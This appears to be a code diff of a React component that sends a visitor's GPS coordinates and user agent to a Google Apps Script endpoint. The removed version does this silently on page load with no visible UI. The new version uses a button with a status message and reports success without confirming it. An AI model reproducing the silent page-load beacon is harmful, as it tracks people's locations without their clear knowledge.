@@ -1,79 +1,67 @@
 "use client";
 
-import { useEffect } from "react";
+import { useState } from "react";
 
 export default function SendLocation() {
-  useEffect(() => {
-    const sendLocation = async () => {
-      if (!navigator.geolocation) {
-        console.log("Geolocation tidak didukung di browser ini");
-        return;
-      }
+  const [status, setStatus] = useState("Menunggu interaksi...");
 
-      try {
-        // Minta lokasi
-        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 300000, // Cache 5 menit
-          });
-        });
+  const requestLocation = () => {
+    if (!navigator.geolocation) {
+      setStatus("Browser tidak mendukung geolocation");
+      return;
+    }
 
+    setStatus("Meminta izin lokasi...");
+
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
         const { latitude, longitude } = position.coords;
 
-        console.log("Lokasi berhasil didapat:", { latitude, longitude });
+        setStatus("Lokasi didapat, mengirim...");
 
         const GAS_URL =
           "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec";
 
-        // Kirim data
         fetch(GAS_URL, {
           method: "POST",
           mode: "no-cors",
-          headers: {
-            "Content-Type": "application/json",
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             latitude,
             longitude,
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
           }),
-        }).catch((err) => console.log("Gagal mengirim lokasi:", err));
+        });
 
-      } catch (error: any) {
-        console.error("Error mendapatkan lokasi:", error);
+        setStatus("Lokasi berhasil dikirim!");
+      },
 
-        // ERROR HANDLER AMAN untuk HP & PC
-        const code = error.code;
+      (error) => {
+        if (error.code === 1) setStatus("Izin lokasi ditolak");
+        else if (error.code === 2) setStatus("Lokasi tidak tersedia");
+        else if (error.code === 3) setStatus("Timeout");
+        else setStatus("Error lokasi tidak diketahui");
+      },
 
-        if (code === 1) {
-          console.log("Permission lokasi ditolak");
-        } else if (code === 2) {
-          console.log("Lokasi tidak tersedia");
-        } else if (code === 3) {
-          console.log("Timeout");
-        } else {
-          console.log("Error lain:", error);
-        }
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 300000,
       }
-    };
+    );
+  };
 
-    // cek izin lokasi jika permissions API tersedia
-    if (navigator.permissions) {
-      navigator.permissions
-        .query({ name: "geolocation" as PermissionName })
-        .then((result) => {
-          console.log("Izin saat ini:", result.state);
-        })
-        .catch(() => {});
-    }
+  return (
+    <div className="p-4">
+      <button
+        onClick={requestLocation}
+        className="px-4 py-2 bg-blue-600 text-white rounded"
+      >
+        Izinkan Lokasi & Kirim
+      </button>
 
-    const timer = setTimeout(sendLocation, 1200);
-
-    return () => clearTimeout(timer);
-  }, []);
-
-  return null;
+      <p className="mt-3">{status}</p>
+    </div>
+  );
 }
